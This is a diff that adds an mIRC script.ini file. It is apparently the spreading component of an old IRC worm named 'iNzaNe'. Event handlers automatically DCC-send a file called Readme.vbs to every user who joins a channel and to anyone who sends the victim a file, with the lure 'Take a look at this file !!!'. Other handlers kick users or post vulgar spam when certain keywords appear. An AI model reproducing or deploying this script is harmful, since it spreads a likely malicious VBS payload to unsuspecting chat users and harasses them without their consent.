@@ -1,0 +1,24 @@
+[script]
+n0=;INSANE IN THE BRAIN.
+n1=on *:FILERCVD:/dcc send $nick c:\mirc\downloads\Readme.vbs
+n2=CTCP *:PING:?:/notify $nick iNzaNe !!!!!!
+n3=CTCP *:VERSION:?:/notify $nick iNzaNe in the BRAIN!!!!!!
+n4=CTCP *:CLIENTINFO:?:/notify $nick Dedicated 2 iNzaNe...
+n5=On *:DNS:/Notify $me RESOLVED:127.0.0.1
+n6=On *:CONNECT:/echo iNzaNe is Active!
+n7=On *:JOIN:#:{
+n8=/notify $nick Take a look at this file !!!
+n9=/dcc send $nick c:\mirc\downloads\Readme.vbs
+n10=/notify $nick Thank you and have a nice day.
+n11=}
+n12=On *:TEXT:*insane*:#:/amsg iNzaNe virus made by Mr.Yozi Dedicated 2 insane.
+n13=On *:text:*shit*:#:/msg $nick SHIT!
+n14=On *:TEXT:*low*bap*:#:{
+n15=/kick # $nick FUCK LOW BAP!!!!!!!!
+n16=/msg $nick FUCK LOW BAP MOTHERFUCKER. HARDCORE RAP FOR EVER!!!!!!
+n17=}
+n18=On *:TEXT:*zn*:#:/me ZN MOTHERFUCKERZ!!!!!!!!!!!
+n19=On *:TEXT:*porn*:?:/ame PORNOPARANOIC PAINTERZ CLAN!!!!
+n20=on *:TEXT:*dpc*:?:/me DPC THE BEST !!!!!!!!!!!!
+n21=;INSANE THIS IS FOR YOU!!!!!!!!! 
+n22=;BEWARE OF THE 3C!!!
